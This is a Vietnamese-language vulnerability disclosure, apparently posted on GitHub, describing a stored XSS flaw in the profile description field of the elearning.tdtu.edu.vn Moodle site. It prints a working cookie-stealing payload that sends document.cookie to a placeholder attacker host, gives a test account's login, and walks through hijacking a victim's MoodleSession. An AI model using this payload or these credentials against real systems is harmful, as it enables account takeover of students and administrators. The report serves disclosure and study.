# Lỗ hổng Stored XSS tại trang elearning.tdtu.edu.vn
Ứng dụng web tại `Elearning.tdtu.edu.vn` bị ảnh hưởng bởi lỗ hổng Stored Cross-Site Scripting (XSS). Lỗ hổng này xảy ra do trường `description` trong `user/profile.php` không thực hiện mã hóa (encode) hoặc lọc (filter) đúng cách dữ liệu do người dùng cung cấp trước khi lưu vào cơ sở dữ liệu và hiển thị lại cho người dùng khác.

Kẻ tấn công có thể chèn một đoạn mã JavaScript độc hại vào trường này. Khi một nạn nhân (bao gồm cả quản trị viên) xem trang hồ sơ công khai của kẻ tấn công, đoạn mã độc sẽ tự động được thực thi trong bối cảnh (context) trình duyệt của nạn nhân, dẫn đến việc kẻ tấn công có thể chiếm quyền điều khiển tài khoản của họ.

## Đánh giá lỗ hổng 
- **OSWAP**: A03-2021 - Injection
- **Loại lỗ hổng** : Cross-site-scripting (XSS) - Stored
- **Vị trí ảnh hưởng** : ` https://elearning.tdtu.edu.vn/user/edit.php`
- **Tham số ảnh hưởng** : `description` - trường mô tả bản thân

## Kịch bản khai thác (POV)
### Kịch bản 1: Session Hijacking thông qua endpoint `user/edit.php`.
Kịch bản này giả định người tấn công có tài khoản sinh và modify `description` tạo một payload độc hại cho phép đánh cắp `session` khi victim click vào link profile.

  * **Mục tiêu:** Đánh cắp session

  * **Giai đoạn 1: Đăng nhập tài khoản và truy cập endpoint edit profile**

      * Authenticated: luongtieudai / changeme
      * Truy cập: https://elearning.tdtu.edu.vn/user/edit.php?id=95195&course=1

  * **Giai đoạn 2: Tạo mã độc XSS trên trường `description`**
  Payload được triển khai dựa trên **CVE-2018-1999024**
 ```
 $$ \unicode{<img src=x onerror='fetch("ATTACK_WEBSITE":"+document.cookie)'>} $$
 ```   

  * **Giai đoạn 3: Victim click vào profile và bị đánh cắp cookie**
    
  * **Kết quả:** ATTACK_WEBSITE nhận được thông tin "get" đến chứa cookie của "victim"

## Screen Shot:
### Đăng nhập và truy cập vào endpoit `/user/edit.php`
<img width="2880" height="1800" alt="image" src="https://github.com/user-attachments/assets/5116e40e-e1ea-4115-9f83-7ccf3aea6fea" />
### Tiêm mã độc vào trường `description` và Update profile
<img width="2880" height="1680" alt="image" src="https://github.com/user-attachments/assets/13c905ae-ce59-4598-8ee8-412c87134a4d" />
-
<img width="2880" height="1072" alt="image" src="https://github.com/user-attachments/assets/146af2dd-2a00-49b4-a4df-9af9468b437e" />



### Victim click vào xem profile của Attacker và bị đánh cắp session
<img width="2880" height="1800" alt="image" src="https://github.com/user-attachments/assets/b38d2da7-7f85-475f-8aca-f5db68f1e300" />


### Truy cập với session của nạn nhân
- Thay đổi trường MoodleSession thành của nạn nhân và reset trang web
<img width="2880" height="1800" alt="image" src="https://github.com/user-attachments/assets/fe037d89-a1d7-49ec-89b2-f4cf2909e204" />

<img width="2880" height="1800" alt="image" src="https://github.com/user-attachments/assets/2291d6c1-3cdb-42a1-b578-1b3a863fd6a6" />

